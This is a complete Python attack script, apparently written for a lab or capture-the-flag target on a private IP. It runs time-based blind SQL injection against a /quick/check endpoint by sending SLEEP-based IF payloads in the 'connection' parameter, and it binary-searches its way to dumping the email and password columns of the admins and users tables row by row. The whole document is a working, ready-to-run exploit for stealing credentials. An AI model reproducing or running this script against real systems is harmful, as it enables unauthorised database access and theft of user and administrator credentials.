#!/usr/bin/env python3
# Time-based blind SQLi extractor for /quick/check. For each character position it
# binary-searches the ASCII value by asking yes/no questions that make the DB sleep
# only when true, reading each answer off the response time. Dumps any column from
# any table row by row. Can choose target below or enter one on the cli.
import requests, time, sys

URL = "http://192.168.77.80/quick/check"
BASE = "4100237811"
SLEEP = 1.0
THRESHOLD = 0.7
# Printable ASCII by default. Narrow to 48,102 ('0'..'f') when dumping MD5 hashes
# to cut the requests per character.
CHARSET_LO, CHARSET_HI = 32, 126

# Each target = table to scan. "order" sets a stable row order so counts line up.
TARGETS = {
    "admins": {"table": "admins", "cols": ["email", "password"], "order": "id"},
    "users":  {"table": "users",  "cols": ["email", "password"], "order": "id"},
}

def oracle(cond):
    payload = f"{BASE}' AND IF({cond},SLEEP({SLEEP}),0)=0-- -"
    start = time.time()
    requests.get(URL, params={"connection": payload})
    return (time.time() - start) > THRESHOLD

def count_rows(table):
    # binary-search the row count so I know how many rows to pull
    lo, hi = 0, 1
    while oracle(f"(SELECT COUNT(*) FROM {table})>={hi}"):
        hi *= 2
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"(SELECT COUNT(*) FROM {table})>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

def extract(expr, maxlen=128):
    out = ""
    for pos in range(1, maxlen + 1):
        if not oracle(f"LENGTH({expr})>={pos}"):
            break
        lo, hi = CHARSET_LO, CHARSET_HI
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING({expr},{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        sys.stdout.write(f"\r    [{len(out):3d}] {out}")
        sys.stdout.flush()
    print()
    return out

def dump(table, cols, order):
    n = count_rows(table)
    print(f"[*] {table}: {n} rows")
    rows = []
    for i in range(n):
        # LIMIT i,1 isolates one row and concat the chosen columns for that row
        inner = f"SELECT {','.join(cols)} FROM {table} ORDER BY {order} LIMIT {i},1"
        expr = f"(SELECT CONCAT_WS(0x3a,{','.join(cols)}) FROM ({inner}) r)"
        print(f"  row {i}:")
        rows.append(extract(expr))
    return rows

if __name__ == "__main__":
    # optionally pick targets on the command line (i.e python3 blind_extract.py admins)
    chosen = sys.argv[1:] or list(TARGETS)
    for name in chosen:
        t = TARGETS[name]
        print(f"\n=== dumping {name} ===")
        dump(t["table"], t["cols"], t["order"])
